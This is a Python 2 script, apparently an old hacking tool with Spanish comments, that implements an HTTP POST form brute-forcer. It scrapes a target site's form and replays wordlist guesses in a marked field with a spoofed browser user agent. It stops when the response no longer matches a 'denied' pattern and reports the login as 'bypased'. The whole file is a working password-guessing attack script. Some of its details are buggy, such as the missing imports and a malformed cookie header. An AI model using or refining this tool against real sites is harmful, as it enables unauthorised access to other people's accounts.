#!/usr/bin/python
# -*- coding: utf-8 -*-
# sha0@badchecksum.net

__version__ = "$Revision: 0004000 $"

# POST BRUTEFORCE
# pb = PostBrute()
# pb.setBadGuy('denied')
# pb.getForm('www.victym.com')
# pb.load('/lists/users')
# pb.brute()


#TODO: coger el method post/get
class PostBrute:						#def
	def __init__(self):
		self.opn = urllib2.build_opener()
		self.userAgent ='Microsoft Internet Explorer 6.0'
		self.form = re.compile('</form>',re.IGNORECASE)
		self.action = re.compile('action="?\'?([a-zA-Z0-9_:%?&=/.-]+)',re.IGNORECASE)
		self.param = re.compile('<input([^>]+)>',re.IGNORECASE)
		self.param2 = re.compile('<select([^>]+)>',re.IGNORECASE)
		self.name = re.compile('name="?\'?([a-zA-Z0-9_-]*)',re.IGNORECASE)
		self.fuzzkey = re.compile('%%')
		self.retorno = re.compile('\x0d|\x0a')
		self.value = re.compile('value="?\'?([a-zA-Z0-9_-]*)',re.IGNORECASE)
		self.site = re.compile('https?://[a-zA-Z0-9._:-]+',re.IGNORECASE)
		self.suprime = re.compile('\\\\')
		self.target = ''
		self.params = []
		self.wordlist = []
		self.cookie = ''
		self.method = 'post' #por ahora solo acepta post

	def setCookie(self,cookie):
		self.cookie = cookie

	def setBadGuy(self,bg):
		self.badguy = re.compile(bg,re.IGNORECASE)

	def unique(self,list):
		list.sort()
		list2=[]
		last = ''
		for i in list:
			if i != last:
				list2.insert(-1,i)
			last = i				
		return list2

	def ask(self,msg):
		sys.stdout.write(msg)
		out = sys.stdin.readline()
		return out[0:-1]

	def getForm(self,url):
		initurl = self.site.findall(url)
		req = urllib2.Request(url)
		req.add_header('User-Agent',self.userAgent)
		html = self.opn.open(req).read() 	
		html = self.suprime.sub('',html)
		forms = self.form.findall(html)
		if len(forms) <= 0:
			print 'No forms found!'
			sys.exit(-1)
		if len(forms) > 1:
			count = 1
			for i in forms:
				print "("+str(count)+") "+i
				count += 1
			try:
				form = int(self.ask('%d forms found, wich do you whant? ' % len(forms)))
			except:
				form = 1

			forms  = self.action.findall(html)
			if forms:
				self.target = forms[form-1]
			else:
				self.target = url

		else:

			forms  = self.action.findall(html)
			if forms:
				self.target = forms[0]
			else:
				self.target = url

		if not self.site.match(self.target):
			self.target = ''+initurl[0]+self.target	

		self.getParams(html)

	def getParams(self,html):
		names=[]
		values=[]
		input=0
		params = self.param.findall(html)
		params += self.param2.findall(html)
		for p in self.unique(params):
			n = self.name.findall(p)
			v = self.value.findall(p)
			if len(n)>0:
				if len(v)>0:
					values.append(v[0])
				else:
					values.append('')
					input=1
				names.append(n[0])

		if input:
			print 'Introduce el valor del/los parametro(s), introduce %% para brutearlo:'
		self.params=''
		for p in range(0,len(names)):
			if values[p] == '':
				values[p] = self.ask(str(names[p])+'=')
			self.params += str(names[p])+'='+str(values[p])+'&'

	def load(self,wordlist):
		l = open(wordlist,'r')
		w = l.readlines()
		l.close()
		for i in w:
			x = self.retorno.sub('',i)
			self.wordlist.append(x)

	def brute(self):
		print 'bruteando:\n\n\n'

		for w in self.wordlist:
			param = self.fuzzkey.sub(w,self.params)
			url = self.target+'?'+param
			sys.stdout.write(url+'              \r')
			sys.stdout.flush()
			try:
	                	#req = urllib2.Request(url)Q
				req = urllib2.Request(self.target,param)
                		req.add_header('User-Agent',self.userAgent)
				if self.cookie:
					req.add_header('Cookie:',self.cookie)
                		html = self.opn.open(req).read()
				if not self.badguy.findall(html):
					print 'bypased: '
					#print html
					return
			except ValueError:
				print 'escepcion '+ValueError
				pass
